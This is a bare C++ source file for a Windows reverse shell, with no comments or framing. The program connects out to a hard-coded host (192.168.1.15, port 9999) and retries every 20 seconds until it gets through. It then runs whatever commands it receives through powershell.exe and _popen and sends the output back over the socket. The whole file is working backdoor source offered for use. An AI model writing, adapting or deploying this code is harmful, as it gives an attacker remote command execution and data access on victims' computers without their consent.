#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024
#define BUFFER_SIZE_MEDIUM 4096
#define BUFFER_SIZE_BIG 8192

HANDLE pipe_RRRRRRRR_IN = NULL;
HANDLE pipe_WWWWWWWW_IN = NULL;
HANDLE pipe_RRRRRRRR_OUT = NULL;
HANDLE pipe_WWWWWWWW_OUT = NULL;

STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
wchar_t local_path[512];

void powershell_command(SOCKET, char*);
void powershell_command_cd(SOCKET, char*);
static wchar_t* charToWChar(const char*);
void setDirectory(char*);
void confgShell();
void closeHandles();
void RunShell(SOCKET);
SOCKET attempConnection();


int main()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_SHOWNORMAL);
    SOCKET sock = INVALID_SOCKET;

    while (true)
    {
        sock = attempConnection(); 
        if (sock != INVALID_SOCKET)
        {
            break;
        }
        Sleep(20000);
    }
    
    RunShell(sock);
    return 0;
}

SOCKET attempConnection()
{
    WSADATA version;
    SOCKET mySocket;
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.15");
    addr.sin_port = htons(9999);
    WSAStartup(MAKEWORD(2, 2), &version);
    mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    WSAConnect(mySocket, (struct sockaddr*)&addr, sizeof(addr), 0, 0, 0, 0);

    if (mySocket != INVALID_SOCKET)
    {
        printf("CONNECTED\n");
        return mySocket;
    }
}

void RunShell(SOCKET mySocket)
{
    while (true)
    {
        char container[BUFFER_SIZE_MEDIUM];
        char total_response[BUFFER_SIZE_BIG];
        char received_command[DEFAULT_BUFLEN];
        memset(container, 0, sizeof(container));
        memset(total_response, 0, sizeof(total_response));
        memset(received_command, 0, sizeof(received_command));

        int data_check = recv(mySocket, received_command, DEFAULT_BUFLEN, 0);
        if (data_check == SOCKET_ERROR)
        {
            closesocket(mySocket);
            WSACleanup();
            closeHandles();
            Sleep(20000);
            mySocket = attempConnection();
            continue;
        }
        else
        {
            printf("Received command: %s\n", received_command);
            if (strcmp(received_command, "back\n") == 0)
            {
                break;
            }
            else if (received_command[0] == *"c" && received_command[1] == *"d" && received_command[2] == *" " && (received_command[3] != NULL && received_command[3] != *"\n"))
            {
                strncpy(container, received_command, DEFAULT_BUFLEN);
                powershell_command_cd(mySocket, container);
            }
            else
            {
                powershell_command(mySocket, received_command);
            }

            FILE* fp;
            fp = _popen(received_command, "r");
            int counter = 0;
            while (fgets(container, BUFFER_SIZE_MEDIUM, fp) != NULL)
            {
                for (int i = 0; container[i] != '\0'; i++)
                {
                    counter++;
                    if (counter >= 8180)
                    {
                        try
                        {
                            send(mySocket, total_response, sizeof(total_response), 0);
                        }
                        catch (...)
                        {
                            closesocket(mySocket);
                            WSACleanup();
                            closeHandles();
                            Sleep(20000);
                            mySocket = attempConnection();
                            continue;
                        }
                        memset(total_response, 0, sizeof(total_response));
                        counter = 0;
                    }
                }
                strcat(total_response, container);
            }
            
            fclose(fp);

            try
            {
                send(mySocket, total_response, sizeof(total_response), 0);
            }
            catch(...)
            {
                closesocket(mySocket);
                WSACleanup();
                closeHandles();
                Sleep(20000);
                mySocket = attempConnection();
                continue;
            }
            
        }
    }
    closeHandles();
    Sleep(10000);
}

void confgShell()
{
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    CreatePipe(&pipe_RRRRRRRR_OUT, &pipe_WWWWWWWW_OUT, &sa, 0);
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(STARTUPINFO);
    sinfo.hStdError = pipe_WWWWWWWW_OUT;
    sinfo.hStdOutput = pipe_WWWWWWWW_OUT;
    sinfo.hStdInput = pipe_RRRRRRRR_IN;
    sinfo.dwFlags |= STARTF_USESTDHANDLES;
}
void closeHandles() 
{
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    CloseHandle(pipe_WWWWWWWW_OUT);
    pipe_WWWWWWWW_OUT = 0;
    CloseHandle(pipe_RRRRRRRR_IN);
    pipe_RRRRRRRR_IN = 0;
}

void powershell_command(SOCKET socks_instance, char* command)
{
    confgShell();
    char Process[BUFFER_SIZE_BIG];
    wchar_t cmd[512];
    sprintf(Process, "powershell.exe -Command %s", command);
    wcscpy(cmd, charToWChar(Process));
    SetCurrentDirectory(local_path);
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, local_path, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    closeHandles();

}
// ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
void powershell_command_cd(SOCKET socks_instance, char* command)
{
    confgShell();
    char Process[BUFFER_SIZE_BIG];
    wchar_t cmd[512];
    sprintf(Process, "powershell.exe -Command %s", command);
    wcscpy(cmd, charToWChar(Process));
    GetCurrentDirectory(NULL, local_path);
    setDirectory(command);
    SetCurrentDirectory(local_path);
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, local_path, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    closeHandles();
}
static wchar_t* charToWChar(const char* text)
{
    const size_t size = strlen(text) + 1;
    wchar_t* wText = new wchar_t[size];
    mbstowcs(wText, text, size);
    return wText;
}

void setDirectory(char* source_text)
{
    wchar_t temp[512];
    memset(&local_path, 0, sizeof(local_path));
    wcscpy(temp, charToWChar(source_text));
    for (int i = 0; temp[i + 3] != '\n'; ++i)
    {
        local_path[i] = temp[i + 3];
    }
}
// ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
